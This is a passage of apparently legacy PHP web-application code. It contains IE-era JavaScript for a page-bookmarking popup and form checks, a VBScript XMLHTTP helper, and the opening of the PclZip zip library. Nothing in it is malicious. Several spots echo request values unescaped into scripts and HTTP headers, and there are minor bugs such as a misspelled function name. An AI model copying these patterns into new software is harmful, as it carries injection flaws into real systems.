        window.location.href="<?php  echo $url;?>"&pagecount
end if
end function
//-->
</script>
<?php       
}

function CallPageChange(){
?>
                <input name="Query" value="<?php  echo $query; ?>" style="height:20px;width:50px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
								<input type="submit" class="button" name="gotopage" value=" Go ">                
                <NOSCRIPT>
                <a href="#" style="color:#000000" onclick="vbscript:gotopage()"><?php echo formatchar('转到')?></a>
                </NOSCRIPT>
<?php 
}

}
?>

<?php 
class TagAction{

function TagAction(){
}

function getinfo($url,$type='image',$width,$height){
?>
<html>
<script LANGUAGE="JavaScript">
if (external.menuArguments){
        var parentwin = external.menuArguments;
        var sel,url,title;

	<?php 
	if ($type == 'image'){
	?>
        if(parentwin.event.srcElement.tagName == "IMG"){
                url = parentwin.event.srcElement.getAttribute("SRC");
                if(parentwin.event.srcElement.getAttribute("ALT")!=null && parentwin.event.srcElement.getAttribute("ALT") != ""){
                        title = parentwin.event.srcElement.getAttribute("ALT");
                        sel = parentwin.event.srcElement.getAttribute("ALT");
                }
                else if(parentwin.event.srcElement.innerText!=null && parentwin.event.srcElement.innerText!= ""){
                        title = parentwin.event.srcElement.innerText;
                        sel = parentwin.event.srcElement.innerText;
                }
                else if(parentwin.document.title != null && parentwin.document.title != ""){
                        title = parentwin.document.title;
                        sel = parentwin.document.title;
                }       
                else if(parentwin.event.srcElement.getAttribute("SRC") != null && parentwin.event.srcElement.getAttribute("SRC") != ""){
                        title = parentwin.event.srcElement.getAttribute("SRC");
                        sel = parentwin.event.srcElement.getAttribute("SRC");
                }       
                else{
                        sel = parentwin.location.href;
                        title = parentwin.location.href;
                }       
        }
        <?php 
	}
	elseif ($type == 'link'){
        ?>
        if(parentwin.event.srcElement.tagName == "IMG"){
                url = parentwin.event.srcElement.getAttribute("SRC");
                if(parentwin.event.srcElement.getAttribute("ALT")!=null && parentwin.event.srcElement.getAttribute("ALT") != ""){
                        title = parentwin.event.srcElement.getAttribute("ALT");
                        sel = parentwin.event.srcElement.getAttribute("ALT");
                }
                else if(parentwin.event.srcElement.innerText!=null && parentwin.event.srcElement.innerText!= ""){
                        title = parentwin.event.srcElement.innerText;
                        sel = parentwin.event.srcElement.innerText;
                }
                else if(parentwin.document.title != null && parentwin.document.title != ""){
                        title = parentwin.document.title;
                        sel = parentwin.document.title;
                }       
                else if(parentwin.event.srcElement.getAttribute("SRC") != null && parentwin.event.srcElement.getAttribute("SRC") != ""){
                        title = parentwin.event.srcElement.getAttribute("SRC");
                        sel = parentwin.event.srcElement.getAttribute("SRC");
                }       
                else{
                        sel = parentwin.location.href;
                        title = parentwin.location.href;
                }       
        }
        else if (parentwin.event.srcElement.tagName == "A") {
                url = parentwin.event.srcElement.getAttribute("HREF");
                if(parentwin.event.srcElement.innerText!=null && parentwin.event.srcElement.innerText!= "")
                        title = parentwin.event.srcElement.innerText;
                else if(parentwin.event.srcElement.getAttribute("ALT")!=null && parentwin.event.srcElement.getAttribute("ALT") != "")
                        title = parentwin.event.srcElement.getAttribute("ALT");
                else if(parentwin.document.title != null && parentwin.document.title != "")
                        title = parentwin.document.title;
                else if(parentwin.event.srcElement.getAttribute("HREF") != null && parentwin.event.srcElement.getAttribute("HREF") != "")
                        title = parentwin.event.srcElement.getAttribute("HREF");
                else title = parentwin.location.href;
                
                if(parentwin.event.srcElement.getAttribute("ALT")!=null && parentwin.event.srcElement.getAttribute("ALT") != "")
                        sel = parentwin.event.srcElement.getAttribute("ALT");
                else if (parentwin.event.srcElement.innerText!=null && parentwin.event.srcElement.innerText != "")
                        sel = parentwin.event.srcElement.innerText;
                else if(parentwin.document.title != null && parentwin.document.title != "")
                        sel = parentwin.document.title;
                else if(parentwin.document.title != null && parentwin.document.title != "")
                        sel = parentwin.document.title;
                else if(parentwin.event.srcElement.getAttribute("HREF") != null && parentwin.event.srcElement.getAttribute("HREF") != "")
                        sel = parentwin.event.srcElement.getAttribute("HREF");
                else sel = parentwin.location.href;             
                        
        }
        <?php 
	}
	?>
        else {
                if(parentwin.document.selection.createRange().text != null && parentwin.document.selection.createRange().text != "")
                        sel = parentwin.document.selection.createRange().text;
                else if(parentwin.document.title != null && parentwin.document.title != "")
                        sel = parentwin.document.title; 
                else sel = parentwin.location.href;     

                sel = parentwin.document.selection.createRange().text;

                url = parentwin.location.href;
                
                if(parentwin.document.title != null && parentwin.document.title != ""){
                        title = parentwin.document.title;       
                }       
                else if(parentwin.event.srcElement.getAttribute("ALT")!=null && parentwin.event.srcElement.getAttribute("ALT") != ""){
                        title = parentwin.event.srcElement.getAttribute("ALT"); 
                }       
                else title = parentwin.location.href;           
        }

        var strjavascriptdig = '<?php  echo $url; ?>&t='+escape(title)+'&u='+escape(url)+'&c='+escape(sel);
        void(window.open(strjavascriptdig,'_blank','scrollbars=yes,width=<?php echo $width;?>,height=<?php echo $height;?>,left=75,top=50,status=yes,resizable=yes'));
}
else {
        history.go(-1);
}
</script>
</html>
<?php 
//redirect($url);
}

function jscento(){
?>
<script language="javascript">
function selectTag(obj, index)
{
        if (document.all.XSort.value.indexOf(obj.options[index].value) < 0)
        {
                if (obj.options[index].value != "\"0\"")
                {
                        document.all.XSort.value += " " + obj.options[index].value;
                }
        }
}
</script>

<script language=javascript>
function checkForm(this_form)
{
        if (this_form.Title.value == '')
    {
                alert("标题不能为空, 请重新输入！");
                this_form.Title.focus();                
                return false;
    }

        if (this_form.FromURL.value == '')
    {
                alert("网址不能为空, 请重新输入！");
                this_form.FromURL.focus();              
                return false;
    }

        str = this_form.Title.value;
        len = str.length;       
        
        var tt= "";
        if (str != '')
        {
                var i=0;
                do
                {
                        var c = str.substr(i, 1);
                        if (c != " ")
                        {
                                tt += c;
                                
                                //return false;
                        }
                }while(++i < len);
        }       
        
        var length=this_form.Title.value.length;
        if (this_form.Title.value!="")
        {       
                for(i=0;i<this_form.Title.value.length;i++)
                {
                        if(this_form.Title.value.charCodeAt(i)>255)
                        {
                                length++;
                        }
                }
                if (length > 100)
                {
                        alert ("标题50个汉字之内，请重新输入");
                        this_form.Title.focus();                        
                        return false;
                }
        }
        
        length=this_form.Intro.value.length;
        if (this_form.Intro.value!="")
        {       
                for(i=0;i<this_form.Intro.value.length;i++)
                {
                        if(this_form.Intro.value.charCodeAt(i)>2555)
                        {
                                length++;
                        }
                }
                if (length > 10000)
                {
                        alert ("简介200个汉字之内，请重新输入");
                        this_form.Intro.focus();                                                
                        return false;
                }
        }
        return true;
}
</script>
<script language="JavaScript">
<!--
var Href,Title,Url,Cento;

Href=document.location.href;
var re;
re=new RegExp("&t=(.[^&]*)","ig");
if(re.test(Href)){
        re.exec(Href);
        Title=unescape(RegExp.$1);
}else{
        Title="";
}

re=new RegExp("&u=(.[^&]*)","ig");
if(re.test(Href)){
        re.exec(Href);
        Url=unescape(RegExp.$1);
        re=new RegExp("^(.[^#]*)","ig");
        if(re.test(Url)){
                re.exec(Url);
                Url=RegExp.$1;
        }
}else{
        Url="";
}

re=new RegExp("&c=(.[^&]*)","ig");
if(re.test(Href)){
        re.exec(Href);
        Cento=unescape(RegExp.$1);
}else{
        Cento="";
}
//-->
</script>
<?php 
}

function jscentoload($formname,$unitname,$selectname){
//可选参数：Cento,Title,Url
if (stripos($selectname,"|") == false){
?>
<script language="JavaScript">
        <!--
        document.<?php echo $formname;?>.<?php echo $unitname;?>.value=<?php echo $selectname;?>;
        //-->
</script>
<?php 
}
elseif (stripos($selectname,"|") >= 0){
?>
<script language="JavaScript">
        <!--
        document.<?php echo $formname;?>.<?php echo $unitname;?>.value="标题："+<?php echo arrmenber(split("|",$selectname),(0))?>+"；连接："+<?php  echo arrmember(split("[|]",$selectname),(1))?>+"；摘要："+<?php echo arrmember(split("[|]",$selectname),(2))?>;
        //-->
</script>
<?php 
}
}

}

function xmlhttp(){
?>
Public Function SendXmlHTTPPro(Format,URL,method,PostData,codebase)

        On Error Resume Next

        Err.Clear
        Dim xmlHttp, HttpUrl
        HttpUrl = URL

        Set xmlhttp = CreateObject("Msxml2.XMLHTTP.3.0")
        If Err.Number <> 0 Then
                SendXmlHTTPPro = "不能创建MSXML2.XMLHTTP对象"&" "&err.description
                Err.Clear
                Set xmlHttp = Nothing
                Exit Function
        End If

        dim xmlDOC,i
        if Format = "xml" then 
                Set xmlDOC =CreateObject("MSXML.DOMDocument")
                xmlDOC.loadXML(PostData)
                'Set xmlhttp = CreateObject("Msxml2.XMLHTTP.3.0")
                xmlHttp.Open method, HttpUrl, False
                xmlhttp.setRequestHeader "Content-Type", "text/xml; charset="&codebase
                xmlhttp.setRequestHeader "Content-Length",LEN(PostData)
                xmlhttp.Send(xmlDOC)
        elseif Format = "xoauth" then 
                xmlHttp.Open method, HttpUrl, False
                xmlHttp.setRequestHeader "Content-Length", Len(PostData)
                xmlhttp.setRequestHeader "Content-Type", "text/xml; charset="&codebase
                Set xmlDOC = CreateObject("MSXML2.DOMDocument")
                xmlDOC.loadXML(PostData)
                xmlhttp.Send(PostData)
        elseif Format = "soap" then
                xmlHttp.Open method, URL(0), False
                xmlhttp.setRequestHeader "Content-Type", "text/xml; charset="&codebase
                xmlhttp.setRequestHeader "SOAPAction", URL(1)
                xmlHttp.setRequestHeader "Content-Length", Len(PostData)
                xmlhttp.Send(PostData)
        elseif Format = "stream" then
                xmlHttp.Open method, HttpUrl, False
                if PostData(1) <> "" then
                        xmlHttp.setRequestHeader "Authorization", PostData(1)
                else    
                end if  
                if ubound(PostData) > "1" then
                        for i = 2 to ubound(PostData)
                                xmlHttp.setRequestHeader split(PostData(i),":")(0), split(PostData(i),":")(1)
                        next    
                else
                end if
                xmlhttp.Send(PostData(0))
        elseif Format = "other" then
                xmlHttp.Open method, HttpUrl, False
                if PostData(1) <> "" then
                        'xmlHttp.setRequestHeader "Authorization", PostData(1)
                else    
                end if  
                if ubound(PostData) > "0" then
                        for i = 1 to ubound(PostData)
                                xmlHttp.setRequestHeader split(PostData(i),":")(0), split(PostData(i),":")(1)
                        next    
                else
                end if
                'xmlHttp.setRequestHeader "Content-Length", Len(PostData(0))
                xmlhttp.Send(PostData(0))
        elseif Format = "other-allheader" then
                xmlHttp.Open method, HttpUrl, False
                if ubound(PostData) > "0" then
                        for i = 1 to ubound(PostData)
                                xmlHttp.setRequestHeader split(PostData(i),":")(0), split(PostData(i),":")(1)
                        next    
                else
                end if
                xmlhttp.Send(PostData(0))
        elseif Format = "oauth" then
                Set xmlDOC =CreateObject("MSXML.DOMDocument")
                xmlDOC.loadXML(PostData(0))
                xmlHttp.Open method, HttpUrl, False
                if ubound(PostData) > "2" then
                        xmlHttp.setRequestHeader "Authorization", PostData(1)
                        for i = 2 to ubound(PostData)
                                xmlHttp.setRequestHeader split(PostData(i),":")(0), split(PostData(i),":")(1)
                        next    
                        'xmlhttp.setRequestHeader "Content-Type", "application/atom+xml; charset="&codebase
                        xmlHttp.setRequestHeader "Content-Length", Len(PostData(0))
                        xmlhttp.Send(PostData(0))
                elseif ubound(PostData) = "2" then
                        xmlHttp.setRequestHeader "Authorization", PostData(1)
                        xmlHttp.setRequestHeader split(PostData(2),":")(0), split(PostData(2),":")(1)
                        xmlhttp.setRequestHeader "Content-Type", "application/atom+xml; charset="&codebase
                        xmlHttp.setRequestHeader "Content-Length", Len(PostData(0))
                        xmlhttp.Send(PostData(0))
                elseif ubound(PostData) = "1" then
                        xmlHttp.setRequestHeader "Authorization", PostData(1)
                        xmlhttp.setRequestHeader "Content-Type", "application/atom+xml; charset="&codebase
                        xmlHttp.setRequestHeader "Content-Length", Len(PostData(0))
                        xmlhttp.Send(PostData(0))
                elseif ubound(PostData) = "0" then
                        xmlHttp.setRequestHeader "Authorization", PostData(0)
                        xmlhttp.setRequestHeader "Content-Type", "application/atom+xml; charset="&codebase
                        xmlHttp.setRequestHeader "Content-Length", Len("")
                        xmlhttp.Send("")
                end if  
        elseif Format = "binary" then
                xmlHttp.Open method, HttpUrl, False
                xmlHttp.Send            
        elseif Format = "file" then
                xmlHttp.Open method, HttpUrl, False
                xmlHttp.setRequestHeader "Content-Length", Len(PostData(0))
                xmlHttp.setRequestHeader "Content-Type", PostData(1)
                xmlHttp.Send(PostData(0))               
        else
                xmlHttp.Open method, HttpUrl, False
                xmlHttp.setRequestHeader "Content-Length", Len(PostData)
                xmlHttp.setRequestHeader "Content-Type", "application/x-www-form-urlencoded; charset="&codebase
                xmlHttp.Send PostData
        end if

        If Err.Number <> 0 Or xmlHttp.Readystate <> 4 Then
                Err.Clear
                SendXmlHTTPPro = "MSXML2.XMLHTTP对象错误"&xmlHttp.Readystate&Err.Number
                Set xmlHttp = Nothing
                Exit Function
        End If

        if Format = "binary" then
                SendXmlHTTPPro = xmlHttp.responseBody
        elseif Format = "other-allheader" then
                SendXmlHTTPPro = xmlHttp.getAllResponseHeaders
        elseif Format = "status" then
                SendXmlHTTPPro = xmlhttp.status&"-"&xmlhttp.statusText
        else
                'SendXmlHTTPPro = xmlHttp.responseBody
                SendXmlHTTPPro = xmlHttp.responseText
                SendXmlHTTPPro = BytesToBstr(SendXmlHTTPPro, codebase)  
        end if  

        Set xmlHttp = Nothing

        If Err.Number <> 0 Then
                Err.Clear
        End If

End Function

Public Function xmlhttpdown(url,method,filename,contenttype)
        dim xmlHttp
        Set xmlHttp = CreateObject("MSXML2.XMLHTTP")    
        xmlHttp.Open method, url, False
        xmlHttp.Send
        if filename = "" then
        else    
                Response.AddHeader "Content-Disposition", "attachment;filename="&trim(request("filename"))
        end if
        Response.ContentType = contenttype
        Response.BinaryWrite xmlHttp.responseBody 'Response.BinaryWrite
        Response.Flush                  
        xmlhttpdown = xmlHttp.responseBody
        Set xmlHttp = Nothing
end function

' PowerEasy Xmlhttp Class
' Download Website : http://www.powereasy.net
'指定字符集的字符串转字节数组
Public Function BytesToBstr(strBody, CodeBase)
Dim objStream
Set objStream = CreateObject("Adodb.Stream")
objStream.Type = 1
objStream.Mode = 3
objStream.Open
'objStream.Write strBody
If VarType(strBody) = vbString Then
        objStream.Write BinaryToBytes(strBody)
Else
        objStream.Write strBody
End If
objStream.Position = 0
objStream.Type = 2
objStream.Charset = CodeBase
BytesToBstr = objStream.ReadText
objStream.Close
Set objStream = Nothing
End Function

'字节数组转指定字符集的字符串
Public Function BytesToString(vtData, ByVal strCharset)
    Dim objFile
    Set objFile = CreateObject("ADODB.Stream")
    objFile.Type = 205
    objFile.Open
    If VarType(vtData) = vbString Then
        objFile.Write BinaryToBytes(vtData)
    Else
        objFile.Write vtData
    End If
    objFile.Position = 0
    objFile.Type = 2
    objFile.Charset = strCharset
    BytesToString = objFile.ReadText(-1)
    objFile.Close
    Set objFile = Nothing
End Function

'字节字符串转字节数组，即经过MidB/LeftB/RightB/ChrB等处理过的字符串
Public Function BinaryToBytes(vtData)
    Dim rs
    Dim lSize
    lSize = LenB(vtData)
    Set rs = CreateObject("ADODB.RecordSet")
    rs.Fields.Append "Content", 205, lSize
    rs.Open
    rs.AddNew
    rs("Content").AppendChunk vtData
    rs.Update
    BinaryToBytes = rs("Content").GetChunk(lSize)
    rs.Close
    Set rs = Nothing
End Function

Function URLEncode(strURL)
    Dim I
    Dim tempStr
    For I = 1 To Len(strURL)
        If Asc(Mid(strURL, I, 1)) < 0 Then
            tempStr = "%" & Right(CStr(Hex(Asc(Mid(strURL, I, 1)))), 2)
            tempStr = "%" & Left(CStr(Hex(Asc(Mid(strURL, I, 1)))), Len(CStr(Hex(Asc(Mid(strURL, I, 1))))) - 2) & tempStr
            URLEncode = URLEncode & tempStr
        ElseIf (Asc(Mid(strURL, I, 1)) >= 65 And Asc(Mid(strURL, I, 1)) <= 90) Or (Asc(Mid(strURL, I, 1)) >= 97 And Asc(Mid(strURL, I, 1)) <= 122) Or (Asc(Mid(strURL, I, 1)) >= 48 And Asc(Mid(strURL, I, 1)) <= 57) Then
            URLEncode = URLEncode & Mid(strURL, I, 1)
        Else
            URLEncode = URLEncode & "%" & Hex(Asc(Mid(strURL, I, 1)))
        End If
    Next
End Function

Function URLDecode(strURL)
    Dim I

    If InStr(strURL, "%") = 0 Then
        URLDecode = strURL
        Exit Function
    End If

    For I = 1 To Len(strURL)
        If Mid(strURL, I, 1) = "%" Then
            If Eval("&H" & Mid(strURL, I + 1, 2)) > 127 Then
                URLDecode = URLDecode & Chr(Eval("&H" & Mid(strURL, I + 1, 2) & Mid(strURL, I + 4, 2)))
                I = I + 5
            Else
                URLDecode = URLDecode & Chr(Eval("&H" & Mid(strURL, I + 1, 2)))
                I = I + 2
            End If
        Else
            URLDecode = URLDecode & Mid(strURL, I, 1)
        End If
    Next
End Function
<?php 
}
?>  

<?php 
// --------------------------------------------------------------------------------
// PhpConcept Library - Zip Module 2.6
// --------------------------------------------------------------------------------
// License GNU/LGPL - Vincent Blavet - March 2006
// http://www.phpconcept.net
// --------------------------------------------------------------------------------
//
// Presentation :
//   PclZip is a PHP library that manage ZIP archives.
//   So far tests show that archives generated by PclZip are readable by
//   WinZip application and other tools.
//
// Description :
//   See readme.txt and http://www.phpconcept.net
//
// Warning :
//   This library and the associated files are non commercial, non professional
//   work.
//   It should not have unexpected results. However if any damage is caused by
//   this software the author can not be responsible.
//   The use of this software is at the risk of the user.
//
// --------------------------------------------------------------------------------
// $Id: pclzip.lib.php,v 1.47 2007/07/20 13:56:07 vblavet Exp $
// --------------------------------------------------------------------------------

  // ----- Constants
  if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
    define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
  }
  
  // ----- File list separator
  // In version 1.x of PclZip, the separator for file list is a space
  // (which is not a very smart choice, specifically for windows paths !).
  // A better separator should be a comma (,). This constant gives you the
  // abilty to change that.
  // However notice that changing this value, may have impact on existing
  // scripts, using space separated filenames.
  // Recommanded values for compatibility with older versions :
  //define( 'PCLZIP_SEPARATOR', ' ' );
  // Recommanded values for smart separation of filenames.
  if (!defined('PCLZIP_SEPARATOR')) {
    define( 'PCLZIP_SEPARATOR', ',' );
  }

  // ----- Error configuration
  // 0 : PclZip Class integrated error handling
  // 1 : PclError external library error handling. By enabling this
  //     you must ensure that you have included PclError library.
  // [2,...] : reserved for futur use
  if (!defined('PCLZIP_ERROR_EXTERNAL')) {
    define( 'PCLZIP_ERROR_EXTERNAL', 0 );
  }

  // ----- Optional static temporary directory
  //       By default temporary files are generated in the script current
  //       path.
  //       If defined :
  //       - MUST BE terminated by a '/'.
  //       - MUST be a valid, already created directory
  //       Samples :
  // define( 'PCLZIP_TEMPORARY_DIR', '/temp/' );
  // define( 'PCLZIP_TEMPORARY_DIR', 'C:/Temp/' );
  if (!defined('PCLZIP_TEMPORARY_DIR')) {
    define( 'PCLZIP_TEMPORARY_DIR', '' );
  }

// --------------------------------------------------------------------------------
// ***** UNDER THIS LINE NOTHING NEEDS TO BE MODIFIED *****
// --------------------------------------------------------------------------------

  // ----- Global variables
  $g_pclzip_version = "2.6";

  // ----- Error codes
  //   -1 : Unable to open file in binary write mode
  //   -2 : Unable to open file in binary read mode
  //   -3 : Invalid parameters
  //   -4 : File does not exist
  //   -5 : Filename is too long (max. 255)
  //   -6 : Not a valid zip file
  //   -7 : Invalid extracted file size
  //   -8 : Unable to create directory
  //   -9 : Invalid archive extension
  //  -10 : Invalid archive format
  //  -11 : Unable to delete file (unlink)
  //  -12 : Unable to rename file (rename)
  //  -13 : Invalid header checksum
  //  -14 : Invalid archive size
  define( 'PCLZIP_ERR_USER_ABORTED', 2 );
  define( 'PCLZIP_ERR_NO_ERROR', 0 );
  define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
  define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
  define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
  define( 'PCLZIP_ERR_MISSING_FILE', -4 );
  define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
  define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
  define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
  define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
  define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
  define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
  define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
  define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
  define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
  define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
  define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
  define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
  define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
  define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
  define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
  define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
  define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

  // ----- Options values
  define( 'PCLZIP_OPT_PATH', 77001 );
  define( 'PCLZIP_OPT_ADD_PATH', 77002 );
  define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
  define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
  define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
  define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
  define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
  define( 'PCLZIP_OPT_BY_NAME', 77008 );
  define( 'PCLZIP_OPT_BY_INDEX', 77009 );
  define( 'PCLZIP_OPT_BY_EREG', 77010 );
  define( 'PCLZIP_OPT_BY_PREG', 77011 );
  define( 'PCLZIP_OPT_COMMENT', 77012 );
  define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
  define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
  define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
  define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
  define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
  // Having big trouble with crypt. Need to multiply 2 long int
  // which is not correctly supported by PHP ...
  //define( 'PCLZIP_OPT_CRYPT', 77018 );
  define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
  
  // ----- File description attributes
  define( 'PCLZIP_ATT_FILE_NAME', 79001 );
  define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
  define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
  define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
  define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
  define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

  // ----- Call backs values
  define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
  define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
  define( 'PCLZIP_CB_PRE_ADD', 78003 );
  define( 'PCLZIP_CB_POST_ADD', 78004 );
  /* For futur use
  define( 'PCLZIP_CB_PRE_LIST', 78005 );
  define( 'PCLZIP_CB_POST_LIST', 78006 );
  define( 'PCLZIP_CB_PRE_DELETE', 78007 );
  define( 'PCLZIP_CB_POST_DELETE', 78008 );
  */

  // --------------------------------------------------------------------------------
  // Class : PclZip
  // Description :
  //   PclZip is the class that represent a Zip archive.
  //   The public methods allow the manipulation of the archive.
  // Attributes :
  //   Attributes must not be accessed directly.
  // Methods :
  //   PclZip() : Object creator
  //   create() : Creates the Zip archive
  //   listContent() : List the content of the Zip archive
  //   extract() : Extract the content of the archive
  //   properties() : List the properties of the archive
  // --------------------------------------------------------------------------------
  class PclZip
  {
    // ----- Filename of the zip file
    var $zipname = '';

    // ----- File descriptor of the zip file
    var $zip_fd = 0;

    // ----- Internal error handling
    var $error_code = 1;
    var $error_string = '';
    
    // ----- Current status of the magic_quotes_runtime
    // This value store the php configuration for magic_quotes
    // The class can then disable the magic_quotes and reset it after
    var $magic_quotes_status;

  // --------------------------------------------------------------------------------
  // Function : PclZip()
  // Description :
  //   Creates a PclZip object and set the name of the associated Zip archive
  //   filename.
  //   Note that no real action is taken, if the archive does not exist it is not
  //   created. Use create() for that.
  // --------------------------------------------------------------------------------
  function PclZip($p_zipname)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::PclZip', "zipname=$p_zipname");

    // ----- Tests the zlib
    if (!function_exists('gzopen'))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 1, "zlib extension seems to be missing");
      die('Abort '.basename(__FILE__).' : Missing zlib extensions');
    }

    // ----- Set the attributes
    $this->zipname = $p_zipname;
    $this->zip_fd = 0;
    $this->magic_quotes_status = -1;

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 1);
    return;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function :
  //   create($p_filelist, $p_add_dir="", $p_remove_dir="")
  //   create($p_filelist, $p_option, $p_option_value, ...)
  // Description :
  //   This method supports two different synopsis. The first one is historical.
  //   This method creates a Zip Archive. The Zip file is created in the
  //   filesystem. The files and directories indicated in $p_filelist
  //   are added in the archive. See the parameters description for the
  //   supported format of $p_filelist.
  //   When a directory is in the list, the directory and its content is added
  //   in the archive.
  //   In this synopsis, the function takes an optional variable list of
  //   options. See bellow the supported options.
  // Parameters :
  //   $p_filelist : An array containing file or directory names, or
  //                 a string containing one filename or one directory name, or
  //                 a string containing a list of filenames and/or directory
  //                 names separated by spaces.
  //   $p_add_dir : A path to add before the real path of the archived file,
  //                in order to have it memorized in the archive.
  //   $p_remove_dir : A path to remove from the real path of the file to archive,
  //                   in order to have a shorter path memorized in the archive.
  //                   When $p_add_dir and $p_remove_dir are set, $p_remove_dir
  //                   is removed first, before $p_add_dir is added.
  // Options :
  //   PCLZIP_OPT_ADD_PATH :
  //   PCLZIP_OPT_REMOVE_PATH :
  //   PCLZIP_OPT_REMOVE_ALL_PATH :
  //   PCLZIP_OPT_COMMENT :
  //   PCLZIP_CB_PRE_ADD :
  //   PCLZIP_CB_POST_ADD :
  // Return Values :
  //   0 on failure,
  //   The list of the added files, with a status of the add action.
  //   (see PclZip::listContent() for list entry format)
  // --------------------------------------------------------------------------------
  function create($p_filelist)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::create', "filelist='$p_filelist', ...");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Set default values
    $v_options = array();
    $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

    // ----- Look for variable options arguments
    $v_size = func_num_args();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "$v_size arguments passed to the method");

    // ----- Look for arguments
    if ($v_size > 1) {
      // ----- Get the arguments
      $v_arg_list = func_get_args();

      // ----- Remove from the options list the first argument
      array_shift($v_arg_list);
      $v_size--;

      // ----- Look for first arg
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Variable list of options detected");

        // ----- Parse the options
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_ADD => 'optional',
                                                   PCLZIP_CB_POST_ADD => 'optional',
                                                   PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                   PCLZIP_OPT_COMMENT => 'optional'
                                                   //, PCLZIP_OPT_CRYPT => 'optional'
                                             ));
        if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
          return 0;
        }
      }

      // ----- Look for 2 args
      // Here we need to support the first historic synopsis of the
      // method.
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Static synopsis");

        // ----- Get the first argument
        $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

        // ----- Look for the optional second argument
        if ($v_size == 2) {
          $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
        }
        else if ($v_size > 2) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
                                       "Invalid number / type of arguments");
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return 0;
        }
      }
    }

    // ----- Init
    $v_string_list = array();
    $v_att_list = array();
    $v_filedescr_list = array();
    $p_result_list = array();
    
    // ----- Look if the $p_filelist is really an array
    if (is_array($p_filelist)) {
    
      // ----- Look if the first element is also an array
      //       This will mean that this is a file description entry
      if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
        $v_att_list = $p_filelist;
      }
      
      // ----- The list is a list of string names
      else {
        $v_string_list = $p_filelist;
      }
    }

    // ----- Look if the $p_filelist is a string
    else if (is_string($p_filelist)) {
      // ----- Create a list from the string
      $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
    }

    // ----- Invalid variable type for $p_filelist
    else {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }
    
    // ----- Reformat the string list
    if (sizeof($v_string_list) != 0) {
      foreach ($v_string_list as $v_string) {
        if ($v_string != '') {
          $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
        }
        else {
